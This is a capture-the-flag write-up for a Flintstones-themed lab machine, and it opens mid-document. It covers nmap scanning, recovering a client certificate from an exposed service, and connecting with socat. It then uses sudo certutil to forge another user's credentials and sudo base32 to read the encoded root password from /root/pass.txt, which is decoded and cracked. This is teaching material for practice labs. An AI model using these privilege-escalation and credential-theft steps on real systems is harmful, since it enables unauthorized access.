- What is fred's password?
- What is the fred.txt flag?
- What is the root.txt flag?

## Initial Enumeration

### Nmap Scan

`sudo nmap -sV -sC -T4 $ip`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)

An additional all ports scan discovered:

## Website Digging

Visiting the main page:

So by the sound of that clue we're supposed to interact with a port that's over 9000. I try to netcat over to port 9009 and see:

![](images/b3dr0ck2.png)

Not knowing what to do here I type one of the Flinstone's character names: Fred and get an ascii art picture back. I'm going to guess this is one of the easter eggs the author mentioned. Typing other character names doesn't display any additional art.

![](images/b3dr0ck3.png)

I type asdf just to see what will happen and:

```
What are you looking for? asdf
Sorry, unrecognized request: 'asdf'

You use this service to recover your client certificate and private key
What are you looking for?
```

I enter both key and certificate and am given both back:

![](images/b3dr0ck4.png)

![](images/b3dr0ck5.png)

I also try the help command and it gives a hint:

```
What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

I change the permissions on the id_rsa file I created with the key in it and try and ssh over as barney:

```
barney@10.10.39.157's password:
```

Let's try and use the cert to connect over to port 54321. The help command gave us the synxtax:

![](images/b3dr0ck6.png)

I try a help command and it gives a password hint for barney. The ? just tells us this service is for login and password hints. I try the login command and it tells me to use SSH instead, and the password command also gives us what the help command did.

You can also type the fred command here to get the ascii art we did earlier.

The password hash looks like MD5 to me but I run it through hash-identifier anyways to verify:

## System Access

Time to get cracking. I start up hashcat and...it doesn't crack with rockyou.txt. I try crackstation.net and same thing. Maybe this is just the actual password?

```
┌──(kali㉿kali)-[~/work]
└─$ ssh -i id_rsa barney@$ip                               
barney@10.10.39.157's password: 
barney@b3dr0ck:~$
```

Devious. Way to rabbit hole us on that one author, I love it :)

<br>

## System Enumeration

We find barney.txt waiting for us which gives us our first flag:

`wc -c /home/barney/barney.txt`

```
38 /home/barney/barney.txt
```

Checking sudo -l gives us:

```
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

Nothing on GTFOBins for that. I run the command and find we can list the existing certs that are stored in /usr/share/abc/certs:

```
barney@b3dr0ck:~$ sudo certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@b3dr0ck:~$ sudo certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Sep  2 14:30 barney.certificate.pem
-rw-r----- 1 root root 1678 Sep  2 14:30 barney.clientKey.pem
-rw-r----- 1 root root  894 Sep  2 14:30 barney.csr.pem
-rw-r----- 1 root root 1678 Sep  2 14:30 barney.serviceKey.pem
-rw-r----- 1 root root  976 Sep  2 14:29 fred.certificate.pem
-rw-r----- 1 root root 1674 Sep  2 14:29 fred.clientKey.pem
-rw-r----- 1 root root  898 Sep  2 14:29 fred.csr.pem
-rw-r----- 1 root root 1678 Sep  2 14:29 fred.serviceKey.pem
```

The only other option is to generate a new cert and it looks like I can probably do that for fred and authenticate over as him like we did for barney.

`sudo certutil fred fred`

```
Generating credentials for user: fred (fred)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem

ZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDjGX5zDOwE/0Xmxo5X
```

So we've recreated the private key and cert for fred, now let's head back over to port 54321 and get the password for fred and then ssh back over as him:

![](images/b3dr0ck9.png)

`chmod 400 id_rsa2`

`ssh -i id_rsa2 fred@$ip`

```
fred@10.10.39.157's password: 
fred@b3dr0ck:~$ 
```

We can also use the password we were just given to answer the 2nd flag of 'What is fred's password?'.

And again we find fred.txt waiting for us which answers the third flag:

`wc -c /home/fred/fred.txt`

```
38 /home/fred/fred.txt
```

I check sudo -l again:

```
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

I run `/usr/bin/base32 /root/pass.txt` and get back a base32 string:

```
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
```

I decode that:

`echo "ABOVE_HASH" | base32 -d`

```
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

I run the decoded hash again through a base32 -d decode:

```
YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK
```

And then run that hash one more time but through a base64 -d decode:

```
a00a12aad6b7c16bf07032bd05a31d56
```

Finally something useful, that looks like an MD5 hash!

I try and crack it with hashcat using rockyou.txt but it doesn't crack. I check crackstation.net and it's in their tables:

## Root

And switching over to root with `su root`:

```
fred@b3dr0ck:~$ su root
Password: 
root@b3dr0ck:/home/fred#
```

And we're finally able to capture our last flag:

`wc -c /root/root.txt`

```
38 /root/root.txt
```

<br>

With that we've completed this CTF!

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **nmap**
- Using an open service to recover a private key and certificate
- Using **socat** to authenticate with a certificate and private key to another open service on the system which let's us recover our password
- Using the **certutil** utility to overwrite an existing certificate for another user with one we created and using that to laterally move to them
- Finding that we can use the **base32** and **base64** commands as root and using them to display an encoded root password
- Decoding the root password with both **base32** and **base64** into an MD5 hash
- Using **crackstation.net** to recover the password for the MD5 hash
